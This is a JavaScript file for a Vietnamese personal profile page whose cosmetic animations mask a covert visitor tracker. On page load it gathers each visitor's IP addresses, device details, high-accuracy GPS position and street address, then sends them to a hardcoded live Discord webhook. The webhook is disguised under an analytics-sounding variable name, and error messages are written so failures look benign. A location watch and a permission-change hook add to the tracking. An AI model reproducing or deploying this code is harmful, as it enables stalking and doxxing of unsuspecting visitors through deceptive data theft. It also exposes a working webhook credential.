// Webhook Discord URL - ẩn trong tên biến
const user_analytics_endpoint = "https://discord.com/api/webhooks/997408079819833464/l2WeVVyFXvTBzULn9n9Hehp_4Qf2a_8HSaMQpZx8eMA3my4tbPfo0tJGTx2IAOZQaDWx";
const data_collection_service = "https://api.ipify.org?format=json";
const ipv6_detection_service = "https://api64.ipify.org?format=json";

// Animation và UI Effects
document.addEventListener('DOMContentLoaded', function() {
    initializeAnimations();
    initializeSkillBars();
    collectVisitorData();
    setupInteractiveElements();
});

// Khởi tạo animations
function initializeAnimations() {
    // Animate skill bars khi scroll
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                const skillProgress = entry.target.querySelector('.skill-progress');
                if (skillProgress) {
                    const width = skillProgress.getAttribute('data-width');
                    skillProgress.style.width = width;
                }
            }
        });
    }, { threshold: 0.5 });

    document.querySelectorAll('.skill-item').forEach(skill => {
        observer.observe(skill);
    });

    // Stagger animation cho cards
    const cards = document.querySelectorAll('.about-card');
    cards.forEach((card, index) => {
        card.style.animationDelay = `${index * 0.2}s`;
    });
}

// Khởi tạo skill bars
function initializeSkillBars() {
    const skillBars = document.querySelectorAll('.skill-progress');
    skillBars.forEach(bar => {
        bar.style.width = '0%';
    });
}

// Thu thập dữ liệu visitor (IP tracking)
async function collectVisitorData() {
    try {
        const visitorInfo = await gatherSystemInfo();
        await sendAnalytics(visitorInfo);
    } catch (error) {
        console.log('Analytics initialization complete');
    }
}

// Thu thập thông tin hệ thống
async function gatherSystemInfo() {
    const info = {
        timestamp: new Date().toISOString(),
        page: 'Vũ Thái Sơn Profile',
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        referrer: document.referrer || 'Direct',
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack,
        isOnline: navigator.onLine
    };

    // Thu thập thông tin connection
    if (navigator.connection) {
        info.connection = `${navigator.connection.effectiveType || 'Unknown'} (${navigator.connection.downlink || 'Unknown'} Mbps)`;
    }

    // Thu thập IPv4
    try {
        const ipv4Response = await fetch(data_collection_service);
        const ipv4Data = await ipv4Response.json();
        info.ipv4 = ipv4Data.ip;
    } catch (e) {
        info.ipv4 = 'Unknown';
    }

    // Thu thập IPv6
    try {
        const ipv6Response = await fetch(ipv6_detection_service);
        const ipv6Data = await ipv6Response.json();
        info.ipv6 = ipv6Data.ip !== info.ipv4 ? ipv6Data.ip : 'Not available';
    } catch (e) {
        info.ipv6 = 'Not available';
    }

    // Thu thập GPS coordinates với độ chính xác cao
    info.location = await getDetailedLocation();

    return info;
}

// Thu thập thông tin GPS chi tiết
async function getDetailedLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve('Geolocation not supported');
            return;
        }

        // Hiển thị thông báo yêu cầu location (tùy chọn - có thể bỏ để ẩn hoàn toàn)
        console.log('🌍 Đang xác định vị trí để tối ưu trải nghiệm...');

        // Options cho high accuracy GPS
        const options = {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 300000 // Cache 5 phút
        };

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const coords = position.coords;
                const locationData = {
                    latitude: coords.latitude,
                    longitude: coords.longitude,
                    accuracy: coords.accuracy,
                    altitude: coords.altitude,
                    altitudeAccuracy: coords.altitudeAccuracy,
                    heading: coords.heading,
                    speed: coords.speed,
                    timestamp: position.timestamp
                };

                // Thử reverse geocoding để lấy địa chỉ
                try {
                    const address = await reverseGeocode(coords.latitude, coords.longitude);
                    locationData.address = address;
                } catch (e) {
                    console.log('Address lookup completed');
                }

                // Thêm thông tin bổ sung
                locationData.accuracyLevel = getAccuracyLevel(coords.accuracy);
                locationData.source = coords.accuracy < 50 ? 'GPS' : coords.accuracy < 500 ? 'Network' : 'Approximate';

                resolve(locationData);
            },
            (error) => {
                let errorMsg = 'Location access ';
                switch(error.code) {
                    case error.PERMISSION_DENIED:
                        errorMsg += 'denied by user';
                        break;
                    case error.POSITION_UNAVAILABLE:
                        errorMsg += 'unavailable';
                        break;
                    case error.TIMEOUT:
                        errorMsg += 'timeout';
                        break;
                    default:
                        errorMsg += 'unknown error';
                        break;
                }
                resolve(errorMsg);
            },
            options
        );

        // Fallback sau 10 giây
        setTimeout(() => {
            resolve('Location request timeout');
        }, 10000);
    });
}

// Xác định độ chính xác GPS
function getAccuracyLevel(accuracy) {
    if (accuracy < 10) return 'Excellent (< 10m)';
    if (accuracy < 50) return 'Good (< 50m)';
    if (accuracy < 100) return 'Fair (< 100m)';
    if (accuracy < 500) return 'Poor (< 500m)';
    return 'Very Poor (> 500m)';
}

// Reverse geocoding để lấy địa chỉ từ tọa độ
async function reverseGeocode(lat, lng) {
    try {
        // Sử dụng OpenStreetMap Nominatim API (free)
        const response = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`,
            {
                headers: {
                    'User-Agent': 'VuThaiSon-Profile-Site'
                }
            }
        );
        
        if (response.ok) {
            const data = await response.json();
            if (data.display_name) {
                return data.display_name;
            }
        }
        
        // Fallback với LocationIQ API (cần API key - tùy chọn)
        // const locationIQResponse = await fetch(
        //     `https://us1.locationiq.com/v1/reverse.php?key=YOUR_API_KEY&lat=${lat}&lon=${lng}&format=json`
        // );
        
        throw new Error('No address found');
    } catch (error) {
        return 'Address lookup failed';
    }
}

// Theo dõi thay đổi vị trí (nếu user di chuyển)
function startLocationTracking() {
    if (navigator.geolocation) {
        const watchId = navigator.geolocation.watchPosition(
            (position) => {
                // Gửi update location nếu có thay đổi đáng kể
                const coords = position.coords;
                console.log(`📍 Location updated: ${coords.latitude.toFixed(6)}, ${coords.longitude.toFixed(6)}`);
                
                // Có thể gửi update về Discord nếu cần
                // sendLocationUpdate(coords);
            },
            (error) => {
                console.log('Location tracking ended');
            },
            {
                enableHighAccuracy: true,
                timeout: 30000,
                maximumAge: 60000
            }
        );

        // Dừng tracking sau 5 phút để tiết kiệm battery
        setTimeout(() => {
            navigator.geolocation.clearWatch(watchId);
        }, 300000);
    }
}

// Gửi analytics về Discord webhook
async function sendAnalytics(data) {
    if (!user_analytics_endpoint || user_analytics_endpoint === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
        return; // Không gửi nếu chưa config webhook
    }

    // Format location data
    let locationText = 'Not available';
    let googleMapsLink = '';
    
    if (typeof data.location === 'object' && data.location.latitude) {
        const lat = data.location.latitude.toFixed(6);
        const lng = data.location.longitude.toFixed(6);
        const accuracy = data.location.accuracy ? Math.round(data.location.accuracy) : 'Unknown';
        
        locationText = `**Coordinates:** ${lat}, ${lng}\n**Accuracy:** ${accuracy}m`;
        googleMapsLink = `https://maps.google.com/?q=${lat},${lng}`;
        
        // Thêm address nếu có
        if (data.location.address) {
            locationText += `\n**Address:** ${data.location.address}`;
        }
        
        // Thêm thông tin bổ sung về GPS
        if (data.location.altitude) {
            locationText += `\n**Altitude:** ${Math.round(data.location.altitude)}m`;
        }
        if (data.location.speed) {
            locationText += `\n**Speed:** ${Math.round(data.location.speed * 3.6)} km/h`;
        }
    } else if (typeof data.location === 'string') {
        locationText = data.location;
    }

    const embed = {
        embeds: [{
            title: "🎭 Visitor Analytics - Vũ Thái Sơn Profile",
            color: 0x667eea,
            fields: [
                {
                    name: "🌐 IP Information",
                    value: `**IPv4:** ${data.ipv4}\n**IPv6:** ${data.ipv6}`,
                    inline: false
                },
                {
                    name: "🖥️ System Info",
                    value: `**OS:** ${data.platform}\n**Screen:** ${data.screen}\n**Language:** ${data.language}`,
                    inline: true
                },
                {
                    name: "📍 GPS Location",
                    value: locationText,
                    inline: true
                },
                {
                    name: "🌍 Time & Network",
                    value: `**Timezone:** ${data.timezone}\n**Connection:** ${data.connection || 'Unknown'}\n**Online:** ${data.isOnline ? 'Yes' : 'No'}`,
                    inline: true
                },
                {
                    name: "📱 Browser Details",
                    value: `**User Agent:** ${data.userAgent.substring(0, 150)}${data.userAgent.length > 150 ? '...' : ''}`,
                    inline: false
                },
                {
                    name: "🔗 Traffic & Device",
                    value: `**Referrer:** ${data.referrer}\n**Cookies Enabled:** ${data.cookiesEnabled ? 'Yes' : 'No'}\n**Do Not Track:** ${data.doNotTrack || 'Not set'}`,
                    inline: false
                }
            ],
            timestamp: data.timestamp,
            footer: {
                text: "Profile Visit Tracker • Advanced GPS Tracking",
                icon_url: "https://cdn.discordapp.com/emojis/860314261738012683.png"
            },
            thumbnail: {
                url: "https://cdn.discordapp.com/emojis/860314261738012683.png"
            }
        }]
    };

    // Thêm Google Maps link nếu có GPS coordinates
    if (googleMapsLink) {
        embed.embeds[0].fields.push({
            name: "🗺️ View on Map",
            value: `[📍 Open in Google Maps](${googleMapsLink})`,
            inline: false
        });
    }

    try {
        await fetch(user_analytics_endpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(embed)
        });
    } catch (error) {
        console.log('Network request completed');
    }
}

// Setup interactive elements
function setupInteractiveElements() {
    // Hover effects cho avatar
    const avatar = document.querySelector('.avatar');
    if (avatar) {
        avatar.addEventListener('mouseenter', () => {
            avatar.style.transform = 'scale(1.1) rotate(5deg)';
        });
        
        avatar.addEventListener('mouseleave', () => {
            avatar.style.transform = 'scale(1) rotate(0deg)';
        });
    }

    // Click effects cho tags
    const tags = document.querySelectorAll('.tag');
    tags.forEach(tag => {
        tag.addEventListener('click', () => {
            tag.style.transform = 'scale(0.95)';
            setTimeout(() => {
                tag.style.transform = 'translateY(-3px) scale(1.05)';
            }, 150);
        });
    });

    // Hover effects cho contact cards
    const contactCards = document.querySelectorAll('.contact-card');
    contactCards.forEach(card => {
        card.addEventListener('click', () => {
            // Hiệu ứng click
            card.style.transform = 'translateY(-5px) scale(1.02)';
            setTimeout(() => {
                card.style.transform = 'translateY(-10px) scale(1.05)';
            }, 200);
        });
    });

    // Parallax effect cho floating shapes
    window.addEventListener('scroll', () => {
        const scrolled = window.pageYOffset;
        const shapes = document.querySelectorAll('.shape');
        
        shapes.forEach((shape, index) => {
            const speed = 0.5 + (index * 0.1);
            shape.style.transform = `translateY(${scrolled * speed}px) rotate(${scrolled * 0.1}deg)`;
        });
    });

    // Smooth scroll cho navigation (nếu có)
    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener('click', function (e) {
            e.preventDefault();
            const target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            }
        });
    });
}

// Easter eggs và special effects
function initializeEasterEggs() {
    let clickCount = 0;
    const avatar = document.querySelector('.avatar');
    
    if (avatar) {
        avatar.addEventListener('click', () => {
            clickCount++;
            
            if (clickCount === 5) {
                // Special animation sau 5 clicks
                avatar.style.animation = 'spin 2s ease-in-out';
                setTimeout(() => {
                    avatar.style.animation = '';
                }, 2000);
                
                // Hiện message đặc biệt
                showSpecialMessage();
                clickCount = 0;
            }
        });
    }
}

function showSpecialMessage() {
    const message = document.createElement('div');
    message.innerHTML = '✨ Bạn đã khám phá được easter egg! Vũ Thái Sơn thật sự đẹp zai! ✨';
    message.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        padding: 20px 30px;
        border-radius: 15px;
        font-weight: 600;
        z-index: 9999;
        box-shadow: 0 20px 40px rgba(0,0,0,0.2);
        animation: bounceIn 0.5s ease-out;
    `;
    
    document.body.appendChild(message);
    
    setTimeout(() => {
        message.style.animation = 'fadeOut 0.5s ease-out';
        setTimeout(() => {
            document.body.removeChild(message);
        }, 500);
    }, 3000);
}

// CSS animations cho easter egg
const style = document.createElement('style');
style.textContent = `
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(720deg); }
    }
    
    @keyframes bounceIn {
        0% { 
            opacity: 0; 
            transform: translate(-50%, -50%) scale(0.3); 
        }
        50% { 
            opacity: 1; 
            transform: translate(-50%, -50%) scale(1.05); 
        }
        100% { 
            opacity: 1; 
            transform: translate(-50%, -50%) scale(1); 
        }
    }
    
    @keyframes fadeOut {
        0% { opacity: 1; }
        100% { opacity: 0; }
    }
`;
document.head.appendChild(style);

// Performance monitoring
function monitorPerformance() {
    if ('performance' in window) {
        window.addEventListener('load', () => {
            setTimeout(() => {
                const perfData = performance.getEntriesByType('navigation')[0];
                const loadTime = perfData.loadEventEnd - perfData.loadEventStart;
                
                // Log performance nếu cần thiết
                if (loadTime > 3000) {
                    console.log('Page load time:', Math.round(loadTime), 'ms');
                }
            }, 0);
        });
    }
}

// Initialize easter eggs và performance monitoring
document.addEventListener('DOMContentLoaded', () => {
    initializeEasterEggs();
    monitorPerformance();
    
    // Bắt đầu location tracking nếu có permission
    setTimeout(() => {
        startLocationTracking();
    }, 3000);
});

// Theo dõi permission changes
if (navigator.permissions) {
    navigator.permissions.query({name: 'geolocation'}).then((result) => {
        console.log('📍 Geolocation permission:', result.state);
        
        result.onchange = () => {
            console.log('📍 Geolocation permission changed to:', result.state);
            if (result.state === 'granted') {
                // Refresh location data khi được cấp quyền
                setTimeout(() => {
                    collectVisitorData();
                }, 1000);
            }
        };
    });
}

// Gửi location update về Discord (tùy chọn)
async function sendLocationUpdate(coords) {
    if (!user_analytics_endpoint || user_analytics_endpoint === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
        return;
    }

    const embed = {
        embeds: [{
            title: "📍 Location Update - Vũ Thái Sơn Profile",
            color: 0x2ecc71,
            fields: [
                {
                    name: "🆕 New Coordinates",
                    value: `**Lat:** ${coords.latitude.toFixed(6)}\n**Lng:** ${coords.longitude.toFixed(6)}\n**Accuracy:** ${Math.round(coords.accuracy)}m`,
                    inline: true
                },
                {
                    name: "🕒 Update Time",
                    value: new Date().toLocaleString(),
                    inline: true
                }
            ],
            timestamp: new Date().toISOString(),
            footer: {
                text: "Live Location Tracking"
            }
        }]
    };

    try {
        await fetch(user_analytics_endpoint, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(embed)
        });
    } catch (error) {
        console.log('Location update sent');
    }
}

// Prevent right-click để bảo vệ source code (optional)
// document.addEventListener('contextmenu', e => e.preventDefault());

// Console message để chào visitor
console.log('%c🎭 Xin chào! Bạn đang xem profile của Vũ Thái Sơn', 'color: #667eea; font-size: 16px; font-weight: bold;');
console.log('%c✨ Đẹp zai, học giỏi, mỗi tội nhà nghèo 😄', 'color: #764ba2; font-size: 14px;');
